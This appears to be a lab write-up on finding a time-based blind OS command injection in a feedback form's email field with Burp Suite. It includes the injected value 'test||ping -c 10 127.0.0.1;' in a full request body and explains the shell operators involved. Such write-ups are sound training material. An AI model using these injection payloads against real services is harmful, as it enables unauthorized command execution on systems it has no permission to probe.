# Blind OS Command Injection — Submit Feedback

Access the **Submit Feedback** page.

![Submit Feedback page](https://github.com/user-attachments/assets/2090b68d-0287-4d63-9c44-7084224df38b)

Submit a normal feedback form and intercept the request using Burp Suite.

![Intercepted feedback request](https://github.com/user-attachments/assets/721f2141-bfec-4cd4-909b-36cf2150f923)

The request contains the following parameters:

```text
csrf=cyp5c8AjlGhMikHv7NRAAlzNfqlXSNSm&name=1&email=test%40test.com&subject=1&message=1
```

Try modifying the parameters individually. Only the `email` parameter shows behavior consistent with OS command execution.

This suggests that the `email` value is likely passed into an OS command or shell command, while the other parameters are handled separately.

## Testing the Email Parameter

Modify the `email` parameter:

```text
email=test@test.com
→
email=test||ping -c 10 127.0.0.1;
```

The full request body becomes:

```text
csrf=cyp5c8AjlGhMikHv7NRAAlzNfqlXSNSm&name=1&email=test||ping -c 10 127.0.0.1;&subject=1&message=1
```

`||` is the shell **OR operator**.

```bash
command1 || command2
```

The second command is executed only if the first command fails.

A single `|` would behave differently because it is a **pipe operator**, which passes the output of one command into another.

## Confirming the Vulnerability

![Delayed response](https://github.com/user-attachments/assets/58fb305f-013d-44b3-8171-2629e4db0902)

The server response is delayed by approximately 10 seconds.

Because the command output is not directly returned in the response, but execution can be confirmed through the response delay, this confirms a **time-based blind OS command injection vulnerability** in the `email` parameter.
